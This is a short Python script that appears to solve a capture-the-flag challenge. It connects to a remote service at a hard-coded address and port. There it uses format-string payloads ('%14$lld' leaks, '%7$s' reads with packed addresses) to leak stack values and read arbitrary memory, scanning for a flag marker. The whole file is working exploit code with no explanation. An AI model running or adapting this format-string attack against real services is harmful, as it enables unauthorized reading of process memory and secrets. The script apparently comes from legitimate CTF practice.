#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    try:
        s.send(fmt+b"\n"); time.sleep(0.04)
        return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X)
    return ask(s,fmt)

s=newconn()
a14=leak_lld(s,14)
print("arg14=",hex(a14))
found=[]
# scan multiple 0x10000 windows around arg14
for base_d in [0, 0x10000, -0x10000, 0x20000, -0x20000, 0x30000, -0x30000]:
    T=(a14)+base_d
    try:
        for d in range(0,0x10000,0x4):
            X=T+d
            r=readmem(s,X)
            if b'PTITCTF' in r or b'2026' in r or b'{' in r:
                print("MARK",hex(X),repr(r[:200])); found.append(X)
            if r==b'' or r==b'<T':
                break
    except Exception as e:
        print("err scanning",hex(T),e)
    if found: break
print("found:", [hex(x) for x in found[:10]])
s.close()
